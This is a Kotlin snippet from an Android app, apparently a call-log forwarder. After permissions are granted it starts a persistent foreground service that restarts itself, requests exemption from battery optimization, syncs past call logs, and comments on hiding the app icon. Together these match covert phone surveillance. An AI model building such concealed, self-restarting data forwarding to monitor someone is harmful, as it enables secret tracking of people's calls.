    private fun onPermissionsGranted() {
        val serviceIntent = Intent(this, ForwarderForegroundService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
        
        setupAutoRunner()
        
        findViewById<TextView>(R.id.statusText).text =
            "✅ Running in Background.\n\n" +
            "Ultimate Background Runner is Active. If killed, it will auto-restart."
            
        // Initial setup only: hide app icon if the user presses a button, instead of auto-hiding immediately
        // We will move the hide logic to a button so they have time to grant battery and auto-start permissions.
            
        requestIgnoreBatteryOptimizations()
        
        // Let's also auto-sync call logs once permissions are granted for the first time
        syncPreviousCallLogs()
    }
